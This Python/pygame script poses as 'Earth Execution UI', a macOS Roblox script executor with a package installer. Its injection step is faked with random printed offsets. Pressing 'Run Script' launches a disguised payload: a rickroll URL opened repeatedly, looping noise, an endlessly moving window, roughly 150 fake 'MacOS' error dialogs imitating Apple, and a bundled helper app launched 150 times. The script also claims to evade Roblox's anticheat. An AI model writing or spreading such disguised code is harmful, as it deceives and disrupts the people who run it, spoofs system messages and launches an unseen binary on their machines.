import sys
import webbrowser
import random
import time
import os
from enum import Enum
from threading import Thread
import threading
import tkinter as tk
import base64
from tkinter import font
import subprocess

# osascript -e 'display dialog "Error allocating memory to [uint64+0x194832] .log at /path/bin/log.diag\nThis error could not be resolved when MacOS tried to restore the daemons at [uint64+0x9f77ba]." with title "MacOS" buttons {"OK", "Report to Apple"} default button "Report to Apple"'
# os.system

# Bootstrapper

BG_COLOR = "#0d1117"
TEXT_COLOR = "#c9d1d9"
INPUT_BG = "#21262d"
INPUT_BORDER = "#30363d"
BUTTON_COLOR = "#238636"
BUTTON_HOVER = "#2ea043"
CURSOR_COLOR = "#c9d1d9"
APP_PYTHON = "python3"
VERSION_EARTH_EXEC = "1.0.0"

def check_library(library):
    try:
        subprocess.check_call([APP_PYTHON, "-c", f"import {library}"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

def install_library(library):
    try:
        subprocess.check_call([APP_PYTHON, "-m", "pip", "install", "-U", library], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

class Bootstrapper(tk.Tk):
    def __init__(self):
        super().__init__()
        self.overrideredirect(True)
        self.configure(bg=BG_COLOR)
        self.geometry("300x150")
        self.center_window()

        self.title_font = font.Font(family="SF Pro", size=16, weight="bold")
        self.button_font = font.Font(family="SF Pro", size=12)

        self.title = tk.Label(self, text=f"Earth Execution {VERSION_EARTH_EXEC} UI Installer", font=self.title_font, bg=BG_COLOR, fg=TEXT_COLOR)
        self.title.pack(pady=(20, 10))

        self.button = tk.Button(self, text="Install Necessary Packages", font=self.button_font, bg=BUTTON_COLOR, fg="#000000", 
                                activebackground=BUTTON_HOVER, activeforeground="#000000", bd=0, padx=10, pady=5, 
                                command=self.start_installation)
        self.button.pack(pady=10)

        self.button.bind("<Enter>", self.on_enter)
        self.button.bind("<Leave>", self.on_leave)

    def center_window(self):
        self.update_idletasks()
        width = self.winfo_width()
        height = self.winfo_height()
        x = (self.winfo_screenwidth() // 2) - (width // 2)
        y = (self.winfo_screenheight() // 2) - (height // 2)
        self.geometry(f"{width}x{height}+{x}+{y}")

    def on_enter(self, e):
        self.button.config(background=BUTTON_HOVER)

    def on_leave(self, e):
        self.button.config(background=BUTTON_COLOR)

    def start_installation(self):
        self.button.config(text="Installing Libraries", state="disabled")
        self.update()

        libraries = ["pygame", "enum"]
        for library in libraries:
            self.button.config(text=f"Installing {library}, Please be Patient")
            self.update()
            if not check_library(library):
                if not install_library(library):
                    self.button.config(text=f"Failed to install {library}")
                    return

        self.button.config(text="Open Earth Executor", state="normal", command=self.open_main_app)

    def open_main_app(self):
        self.destroy()

def main():
    if not all(check_library(lib) for lib in ["pygame", "enum"]):
        app = Bootstrapper()
        app.mainloop()

main()

print("[Earth Execution UI::echo] Initialising libraries")
# Installable Libraries
import pygame
import pyautogui
from Quartz import CGEventCreate, CGEventCreateKeyboardEvent, CGEventPost, CGEventSetFlags # from pyobjc
from Quartz import kCGEventKeyDown, kCGEventKeyUp, kCGHIDEventTap, kCGEventFlagMaskCommand # from pyobjc
print("[Earth Execution UI::echo] Initialised 3 libraries")

current_dir = os.path.dirname(os.path.abspath(__file__))
plant_engine = os.path.join(current_dir, 'Assets', 'HelperToolForEarthExecutionUI.app')
bee_noises = os.path.join(current_dir, 'Assets', 'free bee noises 🤑.mp3')

pygame.init()
pygame.mixer.init()

bee_noises_sound = pygame.mixer.Sound(bee_noises)

SCREEN_WIDTH = 1200
SCREEN_HEIGHT = 800

class Theme(Enum):
    OCEAN = ((20, 40, 80), (40, 80, 120), (60, 120, 160))
    LAND = ((40, 80, 40), (60, 120, 60), (80, 160, 80))
    SNOW = ((220, 220, 240), (200, 200, 220), (180, 180, 200))
    VOLCANO = ((80, 20, 20), (120, 40, 40), (160, 60, 60))

BUTTON_WIDTH = 150
BUTTON_HEIGHT = 40
NAVBAR_HEIGHT = 60
inj_txt = "Inject"
inj_txt_cng_enabled = True
inj = False
set_ = False
ttt = False
ERR_INJ = None

def move_window(x, y):
    os.environ['SDL_VIDEO_WINDOW_POS']='%d,%d' %(x,y)
    pygame.display.set_mode((random.randint(50, 100),random.randint(20, 100)))
    pygame.display.set_mode((SCREEN_WIDTH,SCREEN_HEIGHT))
class Page(Enum):
    EDITOR = 0
    SETTINGS = 1
    EXECUTION = 2

class App:
    def __init__(self):
        self.screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("Earth Execution UI - Not Injected, Inject to Execute")
        self.clock = pygame.time.Clock()
        self.font = pygame.font.Font(None, 16)
        self.theme = Theme.OCEAN
        self.current_page = Page.EDITOR
        self.editor_content = []
        self.cursor_pos = [0, 0]  # [row, column]
        self.transition_progress = 0
        self.transitioning = False
        self.transition_direction = 1
        self.editing = True
        self.key_repeat_delay = 200
        self.key_repeat_interval = 50
        self.key_down_time = {}
        self.lua_keywords = set(['and', 'break', 'do', 'else', 'elseif', 'end', 'false', 'for', 'function', 'if', 'in', 'local', 'nil', 'not', 'or', 'repeat', 'return', 'then', 'true', 'until', 'while'])

    def run(self):
        while True:
            self.handle_events()
            self.update()
            self.draw()
            pygame.display.flip()
            self.clock.tick(60)

    def handle_events(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.MOUSEBUTTONDOWN:
                self.handle_click(event.pos)
            elif event.type == pygame.KEYDOWN and self.current_page == Page.EDITOR and self.editing:
                self.handle_key_press(event)
            elif event.type == pygame.KEYUP and self.current_page == Page.EDITOR and self.editing:
                self.handle_key_release(event)

        self.handle_key_hold()

    def handle_click(self, pos):
        global inj_txt, inj_txt_cng_enabled, ERR_INJ
        if pos[1] < NAVBAR_HEIGHT:
            if 10 <= pos[0] <= 110:
                self.transition_to(Page.EDITOR)
            elif 120 <= pos[0] <= 220:
                self.transition_to(Page.EXECUTION)
            elif SCREEN_WIDTH - 110 <= pos[0] <= SCREEN_WIDTH - 10:
                self.transition_to(Page.SETTINGS)
        elif self.current_page == Page.EDITOR:
            editor_rect = pygame.Rect(10, NAVBAR_HEIGHT + 10, SCREEN_WIDTH - 20, SCREEN_HEIGHT - NAVBAR_HEIGHT - BUTTON_HEIGHT - 30)
            if editor_rect.collidepoint(pos):
                self.editing = True
                row = (pos[1] - editor_rect.top) // self.font.get_height()
                col = (pos[0] - editor_rect.left) // self.font.size(' ')[0]
                self.cursor_pos = [min(row, len(self.editor_content) - 1), min(col, len(self.editor_content[row]) if row < len(self.editor_content) else 0)]
            else:
                self.editing = False
            if SCREEN_WIDTH - BUTTON_WIDTH - 10 <= pos[0] <= SCREEN_WIDTH - 10 and SCREEN_HEIGHT - BUTTON_HEIGHT - 10 <= pos[1] <= SCREEN_HEIGHT - 10:
                self.executescr(editor_rect)
            elif SCREEN_WIDTH - 2 * BUTTON_WIDTH - 20 <= pos[0] <= SCREEN_WIDTH - BUTTON_WIDTH - 20 and SCREEN_HEIGHT - BUTTON_HEIGHT - 10 <= pos[1] <= SCREEN_HEIGHT - 10:
                def a():
                    global inj, inj_txt, inj_txt_cng_enabled, ERR_INJ, stcpt
                    try:
                        if inj_txt_cng_enabled == False:
                            return
                        inj_txt_cng_enabled = False
                        inj_txt = "Injecting, please wait"
                        time.sleep(0.05)
                        print("Finding offsets [uint64]")
                        for i in range(150):
                            print(f"MODIFYING [uint64+0x{str(hex(1000000000000+random.randint(2**16, 2**32)))}] AT GETTING OFFSET HOOKING __meta")
                            time.sleep(0.02)
                        print("Modifying process 'RobloxPlayer'")
                        time.sleep(1)
                        print("Done")
                        inj_txt = "Injected"
                        inj = True
                    except Exception as e:
                        ERR_INJ = str(e)
                        inj_txt = "Failed to inject"
                        inj_txt_cng_enabled = True
                        print(str(e))
                thread_1=Thread(target=a)
                thread_1.start()
                if ERR_INJ != None:
                    pygame.display.set_caption(f"Earth Execution UI - Not Injected, Error While Injecting: '{ERR_INJ}'")
                if inj == True:
                    pygame.display.set_caption("Earth Execution UI - Injected")
        elif self.current_page == Page.SETTINGS:
            theme_buttons = [
                (10, 100, 150, 40),
                (170, 100, 150, 40),
                (330, 100, 150, 40),
                (490, 100, 150, 40)
            ]
            for i, rect in enumerate(theme_buttons):
                if pygame.Rect(rect).collidepoint(pos):
                    self.theme = list(Theme)[i]

    def handle_key_press(self, event):
        if event.key == pygame.K_RETURN:
            if pygame.key.get_mods() & pygame.KMOD_SHIFT:
                self.editing = False
            else:
                self.editor_content.insert(self.cursor_pos[0] + 1, self.editor_content[self.cursor_pos[0]][self.cursor_pos[1]:])
                self.editor_content[self.cursor_pos[0]] = self.editor_content[self.cursor_pos[0]][:self.cursor_pos[1]]
                self.cursor_pos[0] += 1
                self.cursor_pos[1] = 0
        elif event.key in (pygame.K_BACKSPACE, pygame.K_DELETE, pygame.K_LEFT, pygame.K_RIGHT, pygame.K_UP, pygame.K_DOWN):
            self.key_down_time[event.key] = pygame.time.get_ticks()
            self.handle_edit_key(event.key)
        else:
            if self.cursor_pos[0] >= len(self.editor_content):
                self.editor_content.append("")
            current_line = self.editor_content[self.cursor_pos[0]]
            self.editor_content[self.cursor_pos[0]] = current_line[:self.cursor_pos[1]] + event.unicode + current_line[self.cursor_pos[1]:]
            self.cursor_pos[1] += 1

    def handle_key_release(self, event):
        if event.key in self.key_down_time:
            del self.key_down_time[event.key]

    def handle_key_hold(self):
        current_time = pygame.time.get_ticks()
        for key, down_time in list(self.key_down_time.items()):
            if current_time - down_time > self.key_repeat_delay:
                if (current_time - down_time - self.key_repeat_delay) % self.key_repeat_interval == 0:
                    self.handle_edit_key(key)

    def handle_edit_key(self, key):
        if key == pygame.K_BACKSPACE:
            if self.cursor_pos[1] > 0:
                current_line = self.editor_content[self.cursor_pos[0]]
                self.editor_content[self.cursor_pos[0]] = current_line[:self.cursor_pos[1] - 1] + current_line[self.cursor_pos[1]:]
                self.cursor_pos[1] -= 1
            elif self.cursor_pos[0] > 0:
                prev_line = self.editor_content[self.cursor_pos[0] - 1]
                self.cursor_pos[1] = len(prev_line)
                self.editor_content[self.cursor_pos[0] - 1] += self.editor_content.pop(self.cursor_pos[0])
                self.cursor_pos[0] -= 1
        elif key == pygame.K_DELETE:
            if self.cursor_pos[1] < len(self.editor_content[self.cursor_pos[0]]):
                current_line = self.editor_content[self.cursor_pos[0]]
                self.editor_content[self.cursor_pos[0]] = current_line[:self.cursor_pos[1]] + current_line[self.cursor_pos[1] + 1:]
            elif self.cursor_pos[0] < len(self.editor_content) - 1:
                self.editor_content[self.cursor_pos[0]] += self.editor_content.pop(self.cursor_pos[0] + 1)
        elif key == pygame.K_LEFT:
            if self.cursor_pos[1] > 0:
                self.cursor_pos[1] -= 1
            elif self.cursor_pos[0] > 0:
                self.cursor_pos[0] -= 1
                self.cursor_pos[1] = len(self.editor_content[self.cursor_pos[0]])
        elif key == pygame.K_RIGHT:
            if self.cursor_pos[1] < len(self.editor_content[self.cursor_pos[0]]):
                self.cursor_pos[1] += 1
            elif self.cursor_pos[0] < len(self.editor_content) - 1:
                self.cursor_pos[0] += 1
                self.cursor_pos[1] = 0
        elif key == pygame.K_UP:
            if self.cursor_pos[0] > 0:
                self.cursor_pos[0] -= 1
                self.cursor_pos[1] = min(self.cursor_pos[1], len(self.editor_content[self.cursor_pos[0]]))
        elif key == pygame.K_DOWN:
            if self.cursor_pos[0] < len(self.editor_content) - 1:
                self.cursor_pos[0] += 1
                self.cursor_pos[1] = min(self.cursor_pos[1], len(self.editor_content[self.cursor_pos[0]]))
    def executescr(self, script):
        if inj == False:
            os.system("osascript -e 'display dialog \"Could not execute because not injected.\" with title \"Earth Execution UI\" buttons {\"OK\"} default button \"OK\" with icon caution'") 
            return
        def cr():
            os.system("osascript -e 'display dialog \"Execution may be slow to run for the first use depending on your MacOS performance. It will speed up as you use this executor more.\" with title \"Earth Execution UI\" buttons {\"Okay, execute my script please\"} default button \"Okay, execute my script pelase\"'") 
            global ttt
            def ccccccr():
                global ttt
                while ttt == False:
                    time.sleep(1)
                bee_noises_sound.play(2**16)
            thread_7 = Thread(target=ccccccr)
            thread_7.start()
            def ccr():
                global ttt
                ttt = True
                webbrowser.open("https://shattereddisk.github.io/rickroll/rickroll.mp4")
            def ccccr():
                for i in range(9):
                    thread_3 = Thread(target=ccr)
                    thread_3.start()
                    time.sleep(0.05)
            thread_5 = Thread(target=ccccr)
            thread_5.start()

            def cccccr():
                global move_window, ttt
                while ttt == False:
                    time.sleep(1)
                while True:
                    move_window(random.randint(200, 1280), (200, 720))
                    time.sleep(0.02)
            thread_6 = Thread(target=cccccr)
            thread_6.start()
            def cccr():
                os.system("osascript -e 'display dialog \"Error allocating memory to [uint64+0x00000007f8fb573a] .log at /path/bin/log.diag\nThis error could not be resolved when MacOS tried to restore the daemons at [uint64+0x9f77ba].\" with title \"MacOS\" buttons {\"OK\", \"Report to Apple\"} default button \"Report to Apple\"'")
                os.system(f"open {plant_engine}")
            while ttt == False:
                time.sleep(1)
            for i in range(150):
                thread_4 = Thread(target=cccr)
                thread_4.start()
                time.sleep(0.01)
        thread_2 = Thread(target=cr)
        thread_2.start()

    def transition_to(self, page):
        if self.current_page != page and not self.transitioning:
            self.transitioning = True
            self.transition_progress = 0
            self.transition_direction = 1 if page.value > self.current_page.value else -1
            self.current_page = page

    def update(self):
        global set_
        if (set_ == False) and inj:
            pygame.display.set_caption("Earth Execution UI - Injected")
            set_ = True
        if self.transitioning:
            self.transition_progress += 0.05 * self.transition_direction
            if self.transition_progress >= 1 or self.transition_progress <= 0:
                self.transitioning = False
                self.transition_progress = round(self.transition_progress)

    def draw(self):
        self.screen.fill(self.theme.value[0])
        self.draw_navbar()
        
        if self.transitioning:
            self.draw_transition()
        else:
            if self.current_page == Page.EDITOR:
                self.draw_editor()
            elif self.current_page == Page.SETTINGS:
                self.draw_settings()
            elif self.current_page == Page.EXECUTION:
                self.draw_execution()

    def draw_navbar(self):
        pygame.draw.rect(self.screen, self.theme.value[1], (0, 0, SCREEN_WIDTH, NAVBAR_HEIGHT))
        self.draw_button("Editor", (10, 10, 100, 40))
        self.draw_button("Web-based Exec", (120, 10, 100, 40))
        self.draw_button("Theme", (SCREEN_WIDTH - 110, 10, 100, 40))

    def draw_editor(self):
        global inj_txt
        editor_rect = pygame.Rect(10, NAVBAR_HEIGHT + 10, SCREEN_WIDTH - 20, SCREEN_HEIGHT - NAVBAR_HEIGHT - BUTTON_HEIGHT - 30)
        pygame.draw.rect(self.screen, (255, 255, 255), editor_rect)
        
        y = NAVBAR_HEIGHT + 20
        for i, line in enumerate(self.editor_content):
            self.draw_syntax_highlighted_line(line, (20, y))
            if i == self.cursor_pos[0] and self.editing:
                cursor_x = 20 + self.font.size(line[:self.cursor_pos[1]])[0]
                pygame.draw.line(self.screen, (0, 0, 0), (cursor_x, y), (cursor_x, y + self.font.get_height()))
            y += self.font.get_height()

        self.draw_button(inj_txt, (SCREEN_WIDTH - 2 * BUTTON_WIDTH - 20, SCREEN_HEIGHT - BUTTON_HEIGHT - 10, BUTTON_WIDTH, BUTTON_HEIGHT))
        self.draw_button("Run Script", (SCREEN_WIDTH - BUTTON_WIDTH - 10, SCREEN_HEIGHT - BUTTON_HEIGHT - 10, BUTTON_WIDTH, BUTTON_HEIGHT))
    def draw_syntax_highlighted_line(self, line, pos):
        words = line.split()
        x, y = pos
        for word in words:
            if word in self.lua_keywords:
                color = (0, 0, 255)  # Blue for keywords
            elif word.isdigit():
                color = (255, 0, 0)  # Red for numbers
            else:
                color = (0, 0, 0)  # Black for other text
            text_surface = self.font.render(word, True, color)
            self.screen.blit(text_surface, (x, y))
            x += self.font.size(word)[0] + self.font.size(' ')[0]

    def draw_settings(self):
        self.draw_button("Ocean", (10, 100, 150, 40))
        self.draw_button("Land", (170, 100, 150, 40))
        self.draw_button("Snow", (330, 100, 150, 40))
        self.draw_button("Volcano", (490, 100, 150, 40))

    def draw_execution(self):
        text = self.font.render("Web browser based executor will come soon!", True, (255, 255, 255))
        text2 = self.font.render("This will be more undetected than ever before because Hyperion (Roblox anticheat) scans for window names.", True, (255, 255, 255))
        self.screen.blit(text, (SCREEN_WIDTH // 2 - text.get_width() // 2, SCREEN_HEIGHT // 2 - text.get_height()))
        self.screen.blit(text2, (SCREEN_WIDTH // 2 - text2.get_width() // 2, SCREEN_HEIGHT // 2 + text.get_height()))

    def draw_button(self, text, rect):
        pygame.draw.rect(self.screen, self.theme.value[2], rect, 0, 10)
        text_surface = self.font.render(text, True, (255, 255, 255))
        text_rect = text_surface.get_rect(center=(rect[0] + rect[2] // 2, rect[1] + rect[3] // 2))
        self.screen.blit(text_surface, text_rect)

    def draw_transition(self):
        if self.current_page == Page.EDITOR:
            self.draw_editor()
        elif self.current_page == Page.SETTINGS:
            self.draw_settings()
        elif self.current_page == Page.EXECUTION:
            self.draw_execution()

        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, int(255 * abs(self.transition_progress))))
        self.screen.blit(overlay, (0, 0))

if __name__ == "__main__":
    app = App()
    app.run()